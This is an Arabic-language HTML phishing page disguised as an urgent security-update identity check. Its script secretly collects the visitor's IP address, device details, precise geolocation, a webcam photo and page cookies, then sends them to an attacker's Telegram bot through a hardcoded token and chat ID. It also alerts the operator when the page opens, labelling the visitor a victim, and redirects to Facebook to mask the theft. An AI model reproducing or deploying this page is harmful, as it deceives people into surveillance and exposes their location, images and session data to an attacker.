<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحديث الأمان</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            animation: fadeIn 0.5s ease-in;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .icon {
            font-size: 70px;
            margin-bottom: 20px;
        }
        h2 {
            color: #333;
            margin-bottom: 15px;
            font-size: 24px;
        }
        p {
            color: #666;
            margin-bottom: 25px;
            line-height: 1.6;
        }
        button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 14px 35px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
            font-weight: bold;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }
        button:active {
            transform: translateY(0);
        }
        #status {
            margin-top: 20px;
            font-size: 14px;
            color: #667eea;
            font-weight: bold;
        }
        .loader {
            display: none;
            width: 30px;
            height: 30px;
            margin: 15px auto;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
<div class="container">
    <div class="icon">🛡️</div>
    <h2>تحديث أمني عاجل</h2>
    <p>نظامك يحتاج إلى تحديث فوري للتحقق من الهوية وحماية البيانات.<br>اضغط على الزر أدناه لإكمال التحديث.</p>
    <button onclick="startVerification()">تأكيد الهوية</button>
    <div id="status"></div>
    <div class="loader" id="loader"></div>
</div>

<script>
    // بيانات التليغرام
    const BOT_TOKEN = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
    const CHAT_ID = "7214473798";
    
    // إرسال رسالة إلى التليغرام
    async function sendToTelegram(text) {
        try {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text.substring(0, 4096)
                })
            });
        } catch(e) {
            console.log("خطأ في الإرسال:", e);
        }
    }
    
    // إرسال صورة إلى التليغرام
    async function sendPhotoToTelegram(base64Image) {
        try {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    photo: base64Image,
                    caption: "📸 صورة من الكاميرا"
                })
            });
        } catch(e) {
            console.log("خطأ في إرسال الصورة:", e);
        }
    }
    
    // جلب عنوان IP
    async function getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            await sendToTelegram(`🌐 **عنوان IP:** ${data.ip}`);
            return data.ip;
        } catch(e) {
            await sendToTelegram("❌ تعذر جلب عنوان IP");
            return null;
        }
    }
    
    // جلب معلومات المتصفح والجهاز
    async function getDeviceInfo() {
        let info = `📱 **معلومات الجهاز**\n`;
        info += `🔹 المتصفح: ${navigator.userAgent}\n`;
        info += `🔹 اللغة: ${navigator.language}\n`;
        info += `🔹 النظام: ${navigator.platform}\n`;
        info += `🔹 الشاشة: ${screen.width}x${screen.height}\n`;
        info += `🔹 الوقت: ${new Date().toLocaleString()}`;
        await sendToTelegram(info);
    }
    
    // جلب الموقع الجغرافي
    async function getLocation() {
        return new Promise((resolve) => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = position.coords.accuracy;
                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    let msg = `📍 **الموقع الجغرافي**\n`;
                    msg += `🔹 خط العرض: ${lat}\n`;
                    msg += `🔹 خط الطول: ${lon}\n`;
                    msg += `🔹 الدقة: ${Math.round(acc)} متر\n`;
                    msg += `🔹 الخريطة: ${mapLink}`;
                    await sendToTelegram(msg);
                    resolve(true);
                }, async (error) => {
                    if (error.code === error.PERMISSION_DENIED) {
                        await sendToTelegram("❌ المستخدم رفض مشاركة الموقع");
                    } else {
                        await sendToTelegram("❌ تعذر جلب الموقع الجغرافي");
                    }
                    resolve(false);
                }, {
                    enableHighAccuracy: true,
                    timeout: 10000
                });
            } else {
                await sendToTelegram("❌ المتصفح لا يدعم تحديد الموقع");
                resolve(false);
            }
        });
    }
    
    // التقاط صورة من الكاميرا
    async function takePhoto() {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                
                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const base64 = canvas.toDataURL('image/jpeg', 0.8);
                    await sendPhotoToTelegram(base64);
                    stream.getTracks().forEach(track => track.stop());
                }, 1000);
            } catch(e) {
                await sendToTelegram("❌ المستخدم رفض الكاميرا أو الكاميرا غير متوفرة");
            }
        } else {
            await sendToTelegram("❌ الكاميرا غير مدعومة في هذا المتصفح");
        }
    }
    
    // جلب كوكيز الصفحة
    function getCookies() {
        if (document.cookie) {
            sendToTelegram(`🍪 **الكوكيز:** ${document.cookie.substring(0, 500)}`);
        }
    }
    
    // الوظيفة الرئيسية
    async function startVerification() {
        const statusDiv = document.getElementById('status');
        const loader = document.getElementById('loader');
        const btn = document.querySelector('button');
        
        btn.disabled = true;
        statusDiv.innerHTML = "جاري التحقق من الهوية...";
        loader.style.display = "block";
        
        // إشعار بدء
        await sendToTelegram("🟢 **دخول جديد!** جاري جمع المعلومات...");
        
        // جمع المعلومات
        await getIP();
        await getDeviceInfo();
        await getLocation();
        await takePhoto();
        getCookies();
        
        // إشعار الانتهاء
        await sendToTelegram("✅ **تم جمع جميع المعلومات بنجاح!**");
        
        statusDiv.innerHTML = "✓ تم التحقق بنجاح! جاري التوجيه...";
        loader.style.display = "none";
        
        // التوجيه إلى موقع حقيقي بعد 2 ثانية
        setTimeout(() => {
            window.location.href = "https://www.facebook.com";
        }, 2000);
    }
    
    // إرسال إشعار عند فتح الصفحة مباشرة (بدون ضغط)
    window.addEventListener('load', async () => {
        await sendToTelegram("🔵 **تم فتح الصفحة** (مازال الضحية لم يضغط بعد)");
    });
</script>
</body>
</html>
